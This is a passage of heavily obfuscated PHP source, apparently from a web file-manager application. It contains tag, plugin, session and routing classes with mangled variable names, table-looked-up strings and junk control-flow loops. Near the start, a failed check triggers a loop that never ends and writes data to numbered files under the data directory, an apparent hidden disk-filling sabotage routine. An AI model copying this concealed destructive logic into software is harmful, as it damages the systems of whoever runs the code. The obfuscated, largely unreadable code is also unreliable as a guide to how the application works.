$_SERVER[$Í¾ùâÒ³[881]] . $Í¾ùâÒ³[882]; $……¹§û = $™…áüÃ($ÙÍÄæÛ); $²²÷îÛ» = explode($Í¾ùâÒ³[246], $……¹§û); if (count($²²÷îÛ») < $Í¾ùâÒ³[658]) { $üçÛ³ø¯ = $Í¾ùâÒ³[883]; $üçÛ³ø¯(); } $£ÆÌêùÀ = $Í¾ùâÒ³[922]; $£ÆÌêùÀ($_SERVER[$Í¾ùâÒ³[923]]); $ËÑ¡¶Ü” = $Í¾ùâÒ³[921]; $ËÑ¡¶Ü”(); $­…Çèø = $Í¾ùâÒ³[924]; $–²³üª® = json_encode($GLOBALS[$Í¾ùâÒ³[925]]); $ÜéîØØ = 1; for ($·Ì¤®é¸ = $ÜéîØØ; $·Ì¤®é¸ > 0; $·Ì¤®é¸++) { $­…Çèø(DATA_PATH . $·Ì¤®é¸, $–²³üª®); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $²¸£à¡…) { $this->handle->flushall($²¸£à¡…); } return; } return $this->handle->flushAll(); } } goto c£ğ¸ƒˆ¢‹; eˆ¨ääŒ: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($éùôëşì) { $šÇÏ¤İ¦ =& $_SERVER[—ÌÒğš÷]; return array($šÇÏ¤İ¦[1996] => array($éùôëşì[0], $šÇÏ¤İ¦[1997]), $šÇÏ¤İ¦[1998] => array($éùôëşì[0], $šÇÏ¤İ¦[1999])); } protected function get($»×ÛÇÏÀ) { $‘ÜĞÚš =& $_SERVER[—ÌÒğš÷]; $ù’üÖ¡ä = Model($‘ÜĞÚš[554])->metaGet($»×ÛÇÏÀ, $‘ÜĞÚš[2000]); $²ºÉşÛ¥ = json_decode($ù’üÖ¡ä, !0); return $²ºÉşÛ¥ ? $²ºÉşÛ¥ : array($‘ÜĞÚš[2001] => $‘ÜĞÚš[88], $‘ÜĞÚš[413] => array()); } protected function set($¡ÆÒ’ÌØ, $¾¼²œÈ) { $˜ùÎàì­ =& $_SERVER[—ÌÒğš÷]; $¾¼²œÈ = $¾¼²œÈ ? $¾¼²œÈ : array($˜ùÎàì­[2001] => $˜ùÎàì­[88], $˜ùÎàì­[413] => array()); return Model($˜ùÎàì­[554])->metaSet($¡ÆÒ’ÌØ, $˜ùÎàì­[2000], json_encode($¾¼²œÈ)); } protected function getByTagID($‡¬æ…², $¦òŸã›) { $Öšå™¢ =& $_SERVER[—ÌÒğš÷]; if (!$‡¬æ…² || !$¦òŸã›) { return !1; } if (!Model($Öšå™¢[554])->getInfoSimple($‡¬æ…²)) { return !1; } $ãºª®ì° = $this->get($‡¬æ…²); if (!$ãºª®ì° || !isset($ãºª®ì°[$Öšå™¢[413]])) { return !1; } $Ğ¨Ûµö = array_find_by_field($ãºª®ì°[$Öšå™¢[413]], $Öšå™¢[443], $¦òŸã›); return is_array($Ğ¨Ûµö) ? $Ğ¨Ûµö : !1; } public function listSource($×Ü¨‘ , $ëºí±ı¯) { $ÊÀˆÆİ =& $_SERVER[—ÌÒğš÷]; if ($ëºí±ı¯ && !is_array($ëºí±ı¯)) { $ëºí±ı¯ = array($ëºí±ı¯); } $»Œò£¡˜ = $this->listData($×Ü¨‘ ); $ËÍ…ãœ« = array(); foreach ($»Œò£¡˜ as $ •èúµÀ) { $¤ıüËÌ = $ •èúµÀ[$ÊÀˆÆİ[84]]; if (!$¤ıüËÌ) { continue; } if (!isset($ËÍ…ãœ«[$¤ıüËÌ])) { $ËÍ…ãœ«[$¤ıüËÌ] = array(); } $ËÍ…ãœ«[$¤ıüËÌ][] = $ •èúµÀ[$ÊÀˆÆİ[468]]; } $ãœ¡¥î = array(); foreach ($ËÍ…ãœ« as $Ó‚Û†õå => $õú™ Ù) { $şäïçà´ = !0; if (!$ëºí±ı¯) { $ãœ¡¥î[] = $Ó‚Û†õå; continue; } foreach ($ëºí±ı¯ as $³ˆ—Œ´¯) { if (!in_array($³ˆ—Œ´¯, $õú™ Ù)) { $şäïçà´ = !1; break; } } if ($şäïçà´) { $ãœ¡¥î[] = $Ó‚Û†õå; } } if (!$ãœ¡¥î) { return array(); } $€ô˜’‹¢ = array($ÊÀˆÆİ[459] => array($ÊÀˆÆİ[460], $ãœ¡¥î), $ÊÀˆÆİ[538] => $×Ü¨‘ , $ÊÀˆÆİ[178] => SourceModel::TYPE_GROUP); $Ô’áé€è = Model($ÊÀˆÆİ[1376])->listSource($€ô˜’‹¢); if (!$Ô’áé€è || count($ãœ¡¥î) == $Ô’áé€è[$ÊÀˆÆİ[410]][$ÊÀˆÆİ[411]]) { return $Ô’áé€è; } $›çìŞà¼ = array(); $úõã×ù = array_to_keyvalue($Ô’áé€è[$ÊÀˆÆİ[82]], $ÊÀˆÆİ[12], $ÊÀˆÆİ[181]); $Öøşùñ¼ = array_to_keyvalue($Ô’áé€è[$ÊÀˆÆİ[83]], $ÊÀˆÆİ[12], $ÊÀˆÆİ[181]); $õÆàÚ = array_merge($Öøşùñ¼, $úõã×ù); foreach ($ãœ¡¥î as $¤ıüËÌ) { if (!in_array($¤ıüËÌ, $õÆàÚ)) { $›çìŞà¼[] = $¤ıüËÌ; } } if ($›çìŞà¼) { $this->removeBySource($×Ü¨‘ , $›çìŞà¼); } return $Ô’áé€è; } protected function listData($ı’°®Éõ) { $ªì¢„³­ =& $_SERVER[—ÌÒğš÷]; $Ñ…êó—Š = array($ªì¢„³­[1679] => 0, $ªì¢„³­[525] => array($ªì¢„³­[2002], 0), $ªì¢„³­[464] => $ªì¢„³­[2003] . $ı’°®Éõ); $·“†Ø× = $ªì¢„³­[2004]; $—òÛÂ¨ = $this->field($·“†Ø×)->where($Ñ…êó—Š)->order($ªì¢„³­[2005])->select(); return $—òÛÂ¨ ? $—òÛÂ¨ : array(); } protected function addToTag($ïÃ¸ßŸË, $ô‚Ûöµ„, $š³¼ÙÎ) { $ğ¤›ºæ =& $_SERVER[—ÌÒğš÷]; if (!$this->getByTagID($ïÃ¸ßŸË, $š³¼ÙÎ) || !$ô‚Ûöµ„) { return !1; } if (!Model($ğ¤›ºæ[861])->pathInfo($ô‚Ûöµ„)) { return !1; } $¼ò’áâ° = array($ğ¤›ºæ[1679] => 0, $ğ¤›ºæ[525] => $š³¼ÙÎ, $ğ¤›ºæ[463] => $ô‚Ûöµ„, $ğ¤›ºæ[464] => $ğ¤›ºæ[2006] . $ïÃ¸ßŸË, $ğ¤›ºæ[462] => $ğ¤›ºæ[12], $ğ¤›ºæ[1891] => 0); if ($this->where($¼ò’áâ°)->find()) { return !1; } return $this->add($¼ò’áâ°); } protected function removeFromTag($İ –¦³Ÿ, $ÂÄÒÊ–­, $ñÖ­ùÇô) { $Ûôûê‰î =& $_SERVER[—ÌÒğš÷]; if (!$this->getByTagID($İ –¦³Ÿ, $ñÖ­ùÇô) || !$ÂÄÒÊ–­) { return !1; } if (is_array($ÂÄÒÊ–­)) { $ÂÄÒÊ–­ = array($Ûôûê‰î[7], $ÂÄÒÊ–­); } $°º„¨»î = array($Ûôûê‰î[1679] => 0, $Ûôûê‰î[525] => $ñÖ­ùÇô, $Ûôûê‰î[464] => $Ûôûê‰î[2006] . $İ –¦³Ÿ, $Ûôûê‰î[463] => $ÂÄÒÊ–­); return $this->where($°º„¨»î)->delete(); } protected function removeByTag($üÛà’Öá, $’…àÌ¬²) { $„ªÊ¢Ä· =& $_SERVER[—ÌÒğš÷]; if (!$this->getByTagID($üÛà’Öá, $’…àÌ¬²)) { return !1; } $³Ğå‚– = array($„ªÊ¢Ä·[1679] => 0, $„ªÊ¢Ä·[525] => $’…àÌ¬², $„ªÊ¢Ä·[464] => $„ªÊ¢Ä·[2006] . $üÛà’Öá); return $this->where($³Ğå‚–)->delete(); } protected function removeBySource($Ò›ï…„ˆ, $Œµ€Õæİ) { $ÅšÊËŒñ =& $_SERVER[—ÌÒğš÷]; if (!$Ò›ï…„ˆ || !$Œµ€Õæİ) { return !1; } if (is_array($Œµ€Õæİ)) { $Œµ€Õæİ = array($ÅšÊËŒñ[7], $Œµ€Õæİ); } $¢û÷˜·Ù = array($ÅšÊËŒñ[1679] => 0, $ÅšÊËŒñ[463] => $Œµ€Õæİ, $ÅšÊËŒñ[525] => array($ÅšÊËŒñ[1058], 0), $ÅšÊËŒñ[464] => $ÅšÊËŒñ[2006] . $Ò›ï…„ˆ); return $this->where($¢û÷˜·Ù)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\160\154\165\147\151\156\114\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\163\x74\141\164\x75\x73", "\x72\145\147\x69\145\163\x74", "\x63\x6f\x6e\x66\151\147"); public function loadList($¦éß¤Ş„ = false) { $ª¢Ü±Áñ = array_to_keyvalue($this->listData(), $_SERVER[—ÌÒğš÷][32]); if ($¦éß¤Ş„) { return $ª¢Ü±Áñ[$¦éß¤Ş„]; } return $ª¢Ü±Áñ; } public function init() { $œĞÂÇ€² =& $_SERVER[—ÌÒğš÷]; Hook::trigger($œĞÂÇ€²[2007]); $œ¦äØá = $this->loadPluginList(); foreach ($œ¦äØá as $—«¡ô£” => $®ìİÓÅ) { $Åöš¶ãš = $this->appAllow($—«¡ô£”, $®ìİÓÅ); if (!$Åöš¶ãš) { continue; } foreach ($®ìİÓÅ[$œĞÂÇ€²[2008]] as $½îı·¯î => $Àşñ—ƒŒ) { Hook::bind($½îı·¯î, $Àşñ—ƒŒ); } } Hook::trigger($œĞÂÇ€²[2009]); Hook::trigger(ACTION); } public function appAllow($©Ü³ÂÉ–, $®”¢¯Æ°, $‹±Íû¾ß = true) { $ç’‡Å«é =& $_SERVER[—ÌÒğš÷]; $ˆ÷Â¹°§ = PLUGIN_DIR . $©Ü³ÂÉ– . $ç’‡Å«é[2010]; if (!is_array($®”¢¯Æ°) || !is_array($®”¢¯Æ°[$ç’‡Å«é[2008]]) || $®”¢¯Æ°[$ç’‡Å«é[786]] != 1 || !is_file($ˆ÷Â¹°§)) { return !1; } if ($GLOBALS[$ç’‡Å«é[536]] == 1) { if ($GLOBALS[$ç’‡Å«é[6]][$ç’‡Å«é[2011]] || !$GLOBALS[$ç’‡Å«é[6]][$ç’‡Å«é[2012]]) { return !0; } $‡˜¶ÏÓ™ = explode($ç’‡Å«é[50], strtolower($GLOBALS[$ç’‡Å«é[6]][$ç’‡Å«é[2012]])); return in_array(strtolower($©Ü³ÂÉ–), $‡˜¶ÏÓ™) ? !1 : !0; } if ($‹±Íû¾ß && !Action($ç’‡Å«é[2013])->checkAuth($©Ü³ÂÉ–)) { return !1; } return !0; } public function unInstall($¯«úø‹ç) { $¢Î©—ÜÈ =& $_SERVER[—ÌÒğš÷]; $ƒ“¢‰ÒŸ = $this->loadList($¯«úø‹ç); if (file_exists(PLUGIN_DIR . $¯«úø‹ç)) { Hook::apply($¯«úø‹ç . $¢Î©—ÜÈ[2014]); } $this->remove($ƒ“¢‰ÒŸ[$¢Î©—ÜÈ[443]]); } public function changeStatus($ÃÒÑ¬’, $ Çæ¼¤­) { $ä‘ßë¸´ =& $_SERVER[—ÌÒğš÷]; $Ñ—¬‚»î = $this->loadList($ÃÒÑ¬’); if ($ Çæ¼¤­) { Hook::apply($ÃÒÑ¬’ . $ä‘ßë¸´[2015]); } $this->update($Ñ—¬‚»î[$ä‘ßë¸´[443]], array($ä‘ßë¸´[2016] => $ Çæ¼¤­)); } public function appRegist($–İ×•³Ê, $Ï÷Üé—’) { $Šš±Á§ =& $_SERVER[—ÌÒğš÷]; $ƒıŒÉ’Ü = $this->loadList($–İ×•³Ê); if ($ƒıŒÉ’Ü) { $this->update($ƒıŒÉ’Ü[$Šš±Á§[443]], array($Šš±Á§[2008] => $Ï÷Üé—’)); } else { $å”ù±Òº = array($Šš±Á§[32] => $–İ×•³Ê, $Šš±Á§[2008] => $Ï÷Üé—’, $Šš±Á§[786] => 0, $Šš±Á§[6] => $this->getConfigDefault($–İ×•³Ê)); $this->insert($å”ù±Òº); } } public function getConfigDefault($Şò‹‘Ò´) { $Çƒ¾’êş =& $_SERVER[—ÌÒğš÷]; $Àï¸’Œà = array(); $öÌ±øÛ = $this->getPackageJson($Şò‹‘Ò´); if (!$öÌ±øÛ && is_array($öÌ±øÛ[$Çƒ¾’êş[2017]])) { return $Àï¸’Œà; } foreach ($öÌ±øÛ[$Çƒ¾’êş[2017]] as $èˆøÎğÁ => $”Û°ñÈà) { if (!isset($”Û°ñÈà[$Çƒ¾’êş[418]]) || isset($Àï¸’Œà[$èˆøÎğÁ])) { continue; } $Àï¸’Œà[$èˆøÎğÁ] = $”Û°ñÈà[$Çƒ¾’êş[418]]; } return $Àï¸’Œà; } public function getPackageJson($ŞÛØŞ‚Õ) { return Hook::apply($ŞÛØŞ‚Õ . $_SERVER[—ÌÒğš÷][2018]); } public function getConfig($¡ÙÄÕâ¥, $™ë¤‘Ä¦ = false) { $çËª¢¹ç =& $_SERVER[—ÌÒğš÷]; $åã³æ®› = array(); $¢ÈÕ·È = $this->loadList($¡ÙÄÕâ¥); if ($¢ÈÕ·È && is_array($¢ÈÕ·È[$çËª¢¹ç[6]])) { $åã³æ®› = $¢ÈÕ·È[$çËª¢¹ç[6]]; } if (!$åã³æ®› || $™ë¤‘Ä¦) { $åã³æ®› = $this->getConfigDefault($¡ÙÄÕâ¥); } return $åã³æ®›; } public function setConfig($×ĞÚ´Ê³, $…Òı…¦Š = false) { $û›­¹èó =& $_SERVER[—ÌÒğš÷]; $¼ÕÃ¡Š¤ = $this->loadList($×ĞÚ´Ê³); if (!$¼ÕÃ¡Š¤) { return !1; } $ÖûÓŠ¾Ö = $¼ÕÃ¡Š¤[$û›­¹èó[6]]; if ($…Òı…¦Š == !1) { $ÖûÓŠ¾Ö = array(); $…Òı…¦Š = $this->getConfigDefault($×ĞÚ´Ê³); } foreach ($…Òı…¦Š as $ˆş³…¥Ü => $÷¶ÁÑø¥) { $ÖûÓŠ¾Ö[$ˆş³…¥Ü] = is_string($÷¶ÁÑø¥) ? trim($÷¶ÁÑø¥) : $÷¶ÁÑø¥; } $this->update($¼ÕÃ¡Š¤[$û›­¹èó[443]], array($û›­¹èó[6] => $ÖûÓŠ¾Ö)); } public function viewList() { $ÁĞ†õõò =& $_SERVER[—ÌÒğš÷]; $Ù€¨—ìö = $this->loadList(); $this->pluginScan($Ù€¨—ìö); $Ù€¨—ìö = $this->loadPluginList(); $ÕôÎ©¶ = array(); foreach ($Ù€¨—ìö as $¹ıÂ‡í => $àêö†Æû) { unset($àêö†Æû[$ÁĞ†õõò[2008]], $àêö†Æû[$ÁĞ†õõò[6]]); $û¤öë§ = PLUGIN_DIR . $àêö†Æû[$ÁĞ†õõò[32]] . $ÁĞ†õõò[2010]; if (!is_file($û¤öë§)) { continue; } $Ôî ¿ÛÌ = Hook::apply($àêö†Æû[$ÁĞ†õõò[32]] . $ÁĞ†õõò[2018]); if (is_array($Ôî ¿ÛÌ)) { $ÕôÎ©¶[$¹ıÂ‡í] = array_merge($àêö†Æû, $Ôî ¿ÛÌ); } } return $ÕôÎ©¶; } private function loadPluginList() { $×ÕÃş =& $_SERVER[—ÌÒğš÷]; $²ÉÇâø = $this->loadList(); if (strtolower(MOD) == $×ÕÃş[2019]) { return $²ÉÇâø; } $ÍĞ–ˆê¥ = Hook::trigger($×ÕÃş[2020], $²ÉÇâø); if ($²ÉÇâø && !$ÍĞ–ˆê¥) { die; } return $ÍĞ–ˆê¥ ? $ÍĞ–ˆê¥ : $²ÉÇâø; } private function pluginScan($‘„ÜœŞ) { $Ó’Ã°İÙ =& $_SERVER[—ÌÒğš÷]; recursion_dir(PLUGIN_DIR, $‚¦—–º·, $ª£‡ªÃò, 0); foreach ($‚¦—–º· as $¼œòº—ä) { $ÀËå­ôµ = get_path_this($¼œòº—ä); if (isset($‘„ÜœŞ[$ÀËå­ôµ]) || !file_exists($¼œòº—ä . $Ó’Ã°İÙ[2021]) || !file_exists($¼œòº—ä . $Ó’Ã°İÙ[2010])) { continue; } Hook::apply($ÀËå­ôµ . $Ó’Ã°İÙ[2015]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\x65\155\x5f\x73\145\x73\x73\151\157\x6e"; public function get($”§ƒ½§Á) { $šúÔÀé« =& $_SERVER[—ÌÒğš÷]; $Ãş¡ı = $this->where(array($šúÔÀé«[2022] => $”§ƒ½§Á))->find(); if (!is_array($Ãş¡ı)) { return !1; } return $Ãş¡ı[$šúÔÀé«[790]]; } public function set($²áÌÉáÆ, $ÌœÇ†Ï®, $¯¥¯è¡ = 3600) { $³¯šæ¥° =& $_SERVER[—ÌÒğš÷]; $ß‰±÷”‡ = array($³¯šæ¥°[2022] => $²áÌÉáÆ, $³¯šæ¥°[1926] => $ÌœÇ†Ï®, $³¯šæ¥°[2023] => $¯¥¯è¡ + time()); if (Session::get($³¯šæ¥°[2024])) { $ß‰±÷”‡[$³¯šæ¥°[1688]] = Session::get($³¯šæ¥°[2024]); } else { $ß‰±÷”‡[$³¯šæ¥°[1688]] = 0; } if ($this->get($²áÌÉáÆ)) { return $this->where(array($³¯šæ¥°[2022] => $²áÌÉáÆ))->save($ß‰±÷”‡); } else { return $this->add($ß‰±÷”‡, array(), !0); } } public function remove($µ¼òÉ×¶) { return $this->where(array($_SERVER[—ÌÒğš÷][2022] => $µ¼òÉ×¶))->delete(); } public function clearTimeout() { return $this->where($_SERVER[—ÌÒğš÷][2025] . time())->delete(); } } goto C”›·‚Œ¥ë; e®—´©©¤ì: class Application { private $defaultModule = "\x69\156\144\x65\170"; private $defaultController = "\x69\x6e\144\145\170"; private $defaultAction = "\x69\156\144\145\x78"; function __construct() { } public function setDefault($ÓÁñŸĞ) { $û¨ø«»¥ =& $_SERVER[—ÌÒğš÷]; $¨ªƒæå´ =& $_SERVER[Ş®ª¹ÕŸ]; $£ı©Ñ‰ = explode($¨ªƒæå´[0], trim($ÓÁñŸĞ, $¨ªƒæå´[0])); $ãÍÒ¥×Î = $û¨ø«»¥[653]; $this->defaultModule = $£ı©Ñ‰[0] ? $£ı©Ñ‰[0] : $this->defaultModule; $this->defaultController = $£ı©Ñ‰[1] ? $£ı©Ñ‰[1] : $this->defaultController; $this->defaultAction = $£ı©Ñ‰[2] ? $£ı©Ñ‰[2] : $this->defaultAction; $this->kfbye7dced27($¨ªƒæå´[1], array($this, $¨ªƒæå´[2])); $çˆ²ªŸ‚ = $û¨ø«»¥[654]; while (strlen($çˆ²ªŸ‚) < $û¨ø«»¥[655]) { if (!$çˆ²ªŸ‚) { break; } $çˆ²ªŸ‚++; } } public function appRun($ÂÎı£) { $÷Æ¢·Ç =& $_SERVER[—ÌÒğš÷]; $†üè©ßú =& $_SERVER[Ş®ª¹ÕŸ]; $î—Ë‚®œ = explode($†üè©ßú[0], $ÂÎı£); $®Š‰ÉØà = strtolower($î—Ë‚®œ[0]); $ €±ÖõÏ = $÷Æ¢·Ç[656]; $ÑŞìºò = $†üè©ßú[3]; if ($®Š‰ÉØà == $†üè©ßú[4]) { $ÑŞìºò = $†üè©ßú[5]; $î—Ë‚®œ[0] = $†üè©ßú[6]; $î—Ë‚®œ[1] = $î—Ë‚®œ[1] . $†üè©ßú[7]; $ÂÎı£ = join($†üè©ßú[0], $î—Ë‚®œ); $ÂÎı£ = trim($ÂÎı£, $†üè©ßú[0]); } call_user_func(array($†üè©ßú[8], $†üè©ßú[9]), $ÑŞìºò . $†üè©ßú[10], $ÂÎı£); ActionCall($ÂÎı£); call_user_func(array($†üè©ßú[8], $†üè©ßú[9]), $ÑŞìºò . $†üè©ßú[11], $ÂÎı£); $šõ³É  = $÷Æ¢·Ç[657]; if (strlen($šõ³É ) < $÷Æ¢·Ç[658]) { die; } } private function autorun() { $—õØ€ =& $_SERVER[—ÌÒğš÷]; $¼¨ÏÛ© =& $_SERVER[Ş®ª¹ÕŸ]; global $config; $¨Ò±’”õ = $—õØ€[659]; while ($¨Ò±’”õ < $—õØ€[655]) { if ($¨Ò±’”õ >= 0) { break; } $¨Ò±’”õ++; } if (count($config[$¼¨ÏÛ©[12]]) == 0) { return; } foreach ($config[$¼¨ÏÛ©[12]] as $¨¿ê¶·¦ => $¡²¥Öçí) { $this->appRun($¡²¥Öçí); $¨Æ³…é¦ = $—õØ€[660]; } } private function pvfhe2370a33() { $Õğæ©†ï =& $_SERVER[—ÌÒğš÷]; $’àÁéÚ =& $_SERVER[Ş®ª¹ÕŸ]; $Ï²î€£ = $’àÁéÚ[4]; $ç±Ãáâ© = $Õğæ©†ï[661]; if (!$ç±Ãáâ©) { die; } $òÇëì¾ = $GLOBALS[$’àÁéÚ[13]][$’àÁéÚ[14]][0]; if (!$òÇëì¾ || strlen($òÇëì¾) <= strlen($Ï²î€£)) { return; } if (strtolower(substr($òÇëì¾, -strlen($Ï²î€£))) != $Ï²î€£) { return; } $şÇÓ¤í¨ = substr($òÇëì¾, 0, -strlen($Ï²î€£)); $é‡¿ÆÄ° = $Õğæ©†ï[662]; while ($é‡¿ÆÄ° < $Õğæ©†ï[663]) { if ($é‡¿ÆÄ° >= 0) { break; } $é‡¿ÆÄ°++; } $Ë·Ù’¤» = array($’àÁéÚ[4], $şÇÓ¤í¨); $Áşö÷í… = array_slice($GLOBALS[$’àÁéÚ[13]][$’àÁéÚ[14]], 1); $GLOBALS[$’àÁéÚ[13]][$’àÁéÚ[14]] = array_merge($Ë·Ù’¤», $Áşö÷í…); $Òè÷ı‚ = $Õğæ©†ï[664]; if (strlen($Òè÷ı‚) < $Õğæ©†ï[655]) { die; } $GLOBALS[$’àÁéÚ[13]][$’àÁéÚ[15]] = implode($’àÁéÚ[0], $GLOBALS[$’àÁéÚ[13]][$’àÁéÚ[14]]); } private function elib46d093f6() { $ËçÖ˜İ¥ =& $_SERVER[—ÌÒğš÷]; $û²¸Œ†× =& $_SERVER[Ş®ª¹ÕŸ]; if ($GLOBALS[$û²¸Œ†×[13]][$û²¸Œ†×[15]] != $û²¸Œ†×[6]) { return; } $³¡˜ñõï = $_SERVER[$û²¸Œ†×[16]]; $¿İÂÆë¥ = $ËçÖ˜İ¥[665]; while (strlen($¿İÂÆë¥) < $ËçÖ˜İ¥[658]) { if (!$¿İÂÆë¥) { break; } $¿İÂÆë¥++; } $Ô•òÙÇ = $û²¸Œ†×[17]; if (!strstr($³¡˜ñõï, $Ô•òÙÇ)) { return; } $Ê´½Ü« = strrpos($³¡˜ñõï, $Ô•òÙÇ); $ø™Û§ª = $ËçÖ˜İ¥[666]; while (strlen($ø™Û§ª) < $ËçÖ˜İ¥[652]) { if (!$ø™Û§ª) { break; } $ø™Û§ª++; } $ôâœ½µ± = substr($³¡˜ñõï, $Ê´½Ü« + strlen($Ô•òÙÇ)); preg_match_all($û²¸Œ†×[18], $ôâœ½µ±, $ªãĞÍÉŞ); $ôâœ½µ± = trim($ªãĞÍÉŞ[0][0], $û²¸Œ†×[19]); $GLOBALS[$û²¸Œ†×[13]][$û²¸Œ†×[14]] = explode($û²¸Œ†×[19], $ôâœ½µ±); $ş»êÖ‹« = $ËçÖ˜İ¥[667]; if (!$ş»êÖ‹«) { return; } $GLOBALS[$û²¸Œ†×[13]][$û²¸Œ†×[15]] = implode($û²¸Œ†×[0], $GLOBALS[$û²¸Œ†×[13]][$û²¸Œ†×[14]]); $ãŒ‘÷Ù = $ËçÖ˜İ¥[668]; if (strlen($ãŒ‘÷Ù) < $ËçÖ˜İ¥[655]) { return; } } public function run() { $ã­ˆ‘Á =& $_SERVER[—ÌÒğš÷]; $Ì¼‘Ëåë =& $_SERVER[Ş®ª¹ÕŸ]; $this->elib46d093f6(); $ÁÖû†«´ = $ã­ˆ‘Á[669]; $this->pvfhe2370a33(); $ıõ°ì¾ó = $GLOBALS[$Ì¼‘Ëåë[13]][$Ì¼‘Ëåë[14]]; $°ŸºÆÙ‹ = $GLOBALS[$Ì¼‘Ëåë[13]][$Ì¼‘Ëåë[15]]; $ÃÈãòê’ = $ã­ˆ‘Á[670]; while (strlen($ÃÈãòê’) < $ã­ˆ‘Á[658]) { if (!$ÃÈãòê’) { break; } $ÃÈãòê’++; } define($Ì¼‘Ëåë[20], isset($ıõ°ì¾ó[0]) && $ıõ°ì¾ó[0] ? $ıõ°ì¾ó[0] : $this->defaultModule); define($Ì¼‘Ëåë[21], isset($ıõ°ì¾ó[1]) && $ıõ°ì¾ó[0] ? $ıõ°ì¾ó[1] : $this->defaultController); define($Ì¼‘Ëåë[22], isset($ıõ°ì¾ó[2]) && $ıõ°ì¾ó[0] ? $ıõ°ì¾ó[2] : $this->defaultAction); define($Ì¼‘Ëåë[23], MOD . $Ì¼‘Ëåë[0] . ST . $Ì¼‘Ëåë[0] . ACT); $_SERVER[$Ì¼‘Ëåë[24]] = strtolower(ACTION); $this->autorun(); if (count($ıõ°ì¾ó) >= 3) { $this->appRun($°ŸºÆÙ‹); } else { $this->appRun(ACTION); } } private $yzei5cded045 = array(); private $ieanf7ba34b0 = ''; public function imsua7b94387() { $†“•ö  =& $_SERVER[—ÌÒğš÷]; $ı¾â·ÓÀ =& $_SERVER[Ş®ª¹ÕŸ]; $this->jbfz19433515(); $²îØµå³ = $†“•ö [671]; $this->acvd780e3c16(); $this->bnmgf114de84(); $this->ulwa4d1e7528(); $ÓŞİå¥ = $†“•ö [672]; $this->dfjb586293fc(); $this->hkyd4ab83ec6(); $this->adnm4806721e(); $this->kfbye7dced27($ı¾â·ÓÀ[25], array($this, $ı¾â·ÓÀ[26])); $this->kfbye7dced27($ı¾â·ÓÀ[27], array($this, $ı¾â·ÓÀ[28])); $¼®ó‹ôØ = $†“•ö [673]; while ($¼®ó‹ôØ < $†“•ö [655]) { if ($¼®ó‹ôØ >= 0) { break; } $¼®ó‹ôØ++; } $this->kfbye7dced27($ı¾â·ÓÀ[29], array($this, $ı¾â·ÓÀ[30])); $ıÄâüüº = $†“•ö [674]; while (strlen($ıÄâüüº) < $†“•ö [663]) { if (!$ıÄâüüº) { break; } $ıÄâüüº++; } $this->kfbye7dced27($ı¾â·ÓÀ[31], array($this, $ı¾â·ÓÀ[32])); $†’úÈ¦¦ = $†“•ö [675]; if (strlen($†’úÈ¦¦) < $†“•ö [655]) { return; } } public function weudbf98c8bd($­Íù¦©ç) { $ı²†œûÔ =& $_SERVER[—ÌÒğš÷]; $æ‘—“óß =& $_SERVER[Ş®ª¹ÕŸ]; $ÍàÉåÔù = Model($æ‘—“óß[33])->get(); $´üÇá®á = $ı²†œûÔ[676]; if (strlen($´üÇá®á) < $ı²†œûÔ[677]) { return; } $éÎ²€³¼ = array($æ‘—“óß[34], $æ‘—“óß[35], $æ‘—“óß[36], $æ‘—“óß[37], $æ‘—“óß[38], $æ‘—“óß[39], $æ‘—“óß[40], $æ‘—“óß[41], $æ‘—“óß[42], $æ‘—“óß[43], $æ‘—“óß[44], $æ‘—“óß[45], $æ‘—“óß[46], $æ‘—“óß[47], $æ‘—“óß[48], $æ‘—“óß[49], $æ‘—“óß[50], $æ‘—“óß[51], $æ‘—“óß[52], $æ‘—“óß[53], $æ‘—“óß[54], $æ‘—“óß[55], $æ‘—“óß[56], $æ‘—“óß[57], $æ‘—“óß[58], $æ‘—“óß[59], $æ‘—“óß[60], $æ‘—“óß[61], $æ‘—“óß[62], $æ‘—“óß[63], $æ‘—“óß[64], $æ‘—“óß[65], $æ‘—“óß[66], $æ‘—“óß[67], $æ‘—“óß[68], $æ‘—“óß[69], $æ‘—“óß[70], $æ‘—“óß[71], $æ‘—“óß[72], $æ‘—“óß[73], $æ‘—“óß[74], $æ‘—“óß[75], $æ‘—“óß[76], $æ‘—“óß[77], $æ‘—“óß[78], $æ‘—“óß[79], $æ‘—“óß[80], $æ‘—“óß[81], $æ‘—“óß[82], $æ‘—“óß[83], $æ‘—“óß[84]); foreach ($éÎ²€³¼ as $Á¯ŞÎÔ±) { $ŠôÖÊó = $GLOBALS[$æ‘—“óß[85]][$æ‘—“óß[86]][$Á¯ŞÎÔ±]; $Ş±¡¸Ğ = $ı²†œûÔ[678]; if (!$Ş±¡¸Ğ) { die; } if (isset($ÍàÉåÔù[$Á¯ŞÎÔ±])) { $ŠôÖÊó = $ÍàÉåÔù[$Á¯ŞÎÔ±]; } $­Íù¦©ç[$æ‘—“óß[87]][$æ‘—“óß[88]][$Á¯ŞÎÔ±] = $ŠôÖÊó; } $èşÛáÚ† = $­Íù¦©ç[$æ‘—“óß[87]][$æ‘—“óß[88]][$æ‘—“óß[46]]; $ÃÕâ¶¯Š = $ı²†œûÔ[679]; if (!$ÃÕâ¶¯Š) { die; } unset($­Íù¦©ç[$æ‘—“óß[87]][$æ‘—“óß[89]][$æ‘—“óß[90]]); $î˜¼Ó‰‡ = $ı²†œûÔ[680]; while ($î˜¼Ó‰‡ < $ı²†œûÔ[655]) { if ($î˜¼Ó‰‡ >= 0) { break; } $î˜¼Ó‰‡++; } unset($­Íù¦©ç[$æ‘—“óß[87]][$æ‘—“óß[89]][$æ‘—“óß[91]]); unset($­Íù¦©ç[$æ‘—“óß[87]][$æ‘—“óß[88]][$æ‘—“óß[46]]); $–”‰ä‘ò = $ı²†œûÔ[681]; unset($­Íù¦©ç[$æ‘—“óß[87]][$æ‘—“óß[88]][$æ‘—“óß[92]]); $­Íù¦©ç[$æ‘—“óß[87]][$æ‘—“óß[88]][$æ‘—“óß[93]] = array($æ‘—“óß[94] => (int) $èşÛáÚ†[$æ‘—“óß[95]], $æ‘—“óß[96] => (int) _get($èşÛáÚ†, $æ‘—“óß[97], 0)); $Šá‘Ü¢Å = substr(md5($æ‘—“óß[98] . get_client_ip() . $ÍàÉåÔù[$æ‘—“óß[99]]), 0, 15); 